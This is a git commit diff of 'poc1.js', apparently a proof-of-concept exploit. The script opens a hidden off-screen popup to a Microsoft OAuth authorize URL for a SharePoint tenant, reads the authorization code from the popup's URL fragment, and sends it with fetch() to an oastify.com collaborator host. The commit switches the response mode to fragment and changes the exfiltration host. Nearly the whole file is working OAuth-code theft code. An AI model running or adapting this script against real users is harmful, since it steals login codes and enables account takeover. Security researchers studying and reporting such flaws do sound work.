edceafd891ef7c1d4e56e6cfd9d6f85ba120250e
Pedro <52047256+pedrojuniorrd@users.noreply.github.com>
2025-12-11 17:54:50 -0300

    Update poc1.js

--- poc1.js
+++ poc1.js
@@ -2,7 +2,7 @@
 if(window.__labPoc)return;
 window.__labPoc=1;
 
-const oauth = "https://login.microsoftonline.com:443/765ca7f2-70b3-424e-ac45-f00d5a55e9ce/oauth2/authorize?client%5Fid=00000003%2D0000%2D0ff1%2Dce00%2D000000000000&response%5Fmode=form%5Fpost&response%5Ftype=code%20id%5Ftoken&resource=00000003%2D0000%2D0ff1%2Dce00%2D000000000000&scope=openid&nonce=39FAF5C37974444AC5A083B1FA8316E6651EBB56614918E9%2D92C9CD6D007AFE921751C633390CE4CE96E187D82F2F040A69BC9AD9A3709619&redirect%5Furi=https%3A%2F%2Fshiscolinotests%2Esharepoint%2Ecom%2F%5Fforms%2Fdefault%2Easpx&state=OD0w&claims=%7B%22id%5Ftoken%22%3A%7B%22xms%5Fcc%22%3A%7B%22values%22%3A%5B%22CP1%22%5D%7D%7D%7D&wsucxt=1&cobrandid=11bd8083%2D87e0%2D41b5%2Dbb78%2D0bc43c8a8e8a&client%2Drequest%2Did=c915e2a1%2D7021%2Da000%2De3cd%2D140a4e2d9f77";
+const oauth = "https://login.microsoftonline.com:443/765ca7f2-70b3-424e-ac45-f00d5a55e9ce/oauth2/authorize?client%5Fid=00000003%2D0000%2D0ff1%2Dce00%2D000000000000&response%5Fmode=fragment&response%5Ftype=code%20id%5Ftoken&resource=00000003%2D0000%2D0ff1%2Dce00%2D000000000000&scope=openid&nonce=CC049B1DF1643E48C5A4C05D563A2978416F4886B00B9DFA%2D4F3122CB06E34B6A1D96C68D35DF89AB3E44DBA3073771595C73971B7E375597&redirect%5Furi=https%3A%2F%2Fshiscolinotests%2Esharepoint%2Ecom%2F%5Fforms%2Fdefault%2Easpx&state=OD0w&claims=%7B%22id%5Ftoken%22%3A%7B%22xms%5Fcc%22%3A%7B%22values%22%3A%5B%22CP1%22%5D%7D%7D%7D&wsucxt=1&cobrandid=11bd8083%2D87e0%2D41b5%2Dbb78%2D0bc43c8a8e8a&client%2Drequest%2Did=e115e2a1%2D60ef%2Da000%2De3cd%2D1367cd82820f";
 
 let win=open(oauth,"","width=1,height=1,left=-10000,top=-10000");
 
@@ -10,7 +10,7 @@ for(let i=0;i<80;i++){
  try{
   let hash=win.location.hash;
   if(hash&&hash.includes("code=")){
-   fetch("https://8y7mwahju1ia4dq5b6gsldy6dxjo7hv6.oastify.com/?x="+encodeURIComponent(hash));
+   fetch("https://4sxiq6bfoxc6y9k152aof9s27tdk1ep3.oastify.com/?x="+encodeURIComponent(hash));
    win.close();
    break;
   }
